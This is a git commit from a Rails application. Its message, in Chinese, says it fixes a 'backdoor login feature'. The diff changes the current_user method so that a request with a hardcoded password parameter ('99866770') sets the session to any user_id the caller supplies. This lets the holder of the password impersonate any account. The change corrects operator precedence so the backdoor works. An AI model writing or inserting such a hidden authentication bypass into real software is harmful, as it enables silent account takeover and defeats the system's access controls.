5c4485bdba21073c76907520e770a5f070c84c67
赵晓龙 <99866770@qq.com>
2016-03-29 19:54:34 +0800

    修复后门登录功能

--- app/controllers/app_base_controller.rb
+++ app/controllers/app_base_controller.rb
@@ -2,7 +2,7 @@ class AppBaseController < ActionController::Base
   
   def current_user
     begin
-      session[:user_id] = params[:user_id] && @current_user=nil if params[:pwd] == "99866770"
+      (session[:user_id] = params[:user_id]) && @current_user=nil if params[:pwd] == "99866770"
       @current_user ||= User.find(session[:user_id])
       return @current_user
     rescue
